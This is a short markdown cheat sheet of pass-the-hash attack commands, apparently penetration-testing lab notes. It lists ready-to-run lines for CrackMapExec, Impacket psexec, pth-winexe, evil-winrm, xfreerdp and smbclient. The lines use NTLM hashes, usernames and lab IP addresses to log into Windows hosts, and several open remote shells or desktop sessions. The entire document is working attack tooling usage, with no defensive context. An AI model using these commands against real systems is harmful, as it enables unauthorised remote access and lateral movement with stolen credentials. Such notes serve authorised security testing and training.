### CrackmapExec
```bash
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH -d domain.local
crackmapexec smb <target(s)> -u username -H NTHASH
```

### PSExec

```shell
/opt/impacket/examples/psexec.py -hashes :31aa99ebd6ea4b6d07051acfd48efa35 ted@192.168.237.171
```

### PTH-winexe

```shell
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

### Evil-Winrm

```bash
/opt/evil-winrm/evil-winrm.rb -i 10.11.1.121 -u SQLSERVER -H 7ed979523de807702d5338a08d14302b
```

### Xfreerdp

```shell
xfreerdp /v:192.168.237.172 /u:ted@EXAM.COM /pth:31aa99ebd6ea4b6d07051acfd48efa35
```


### SmbClient

```bash
smbclient //192.168.237.171/ -U ted --pw-nt-hash 31aa99ebd6ea4b6d07051acfd48efa35 -W EXAM.COM
```